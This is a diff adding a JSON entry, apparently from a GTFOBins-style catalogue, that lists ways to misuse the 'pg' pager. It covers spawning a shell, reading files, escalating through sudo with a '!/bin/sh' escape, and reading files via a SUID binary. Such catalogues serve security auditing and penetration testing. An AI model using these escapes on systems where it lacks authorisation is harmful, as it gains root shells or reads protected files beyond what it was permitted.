@@ -1,0 +1,24 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "pg /etc/profile\n!/bin/sh\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "pg file_to_read"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo pg /etc/profile\n!/bin/sh\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./pg file_to_read"
+      }
+    ]
+  }
+}
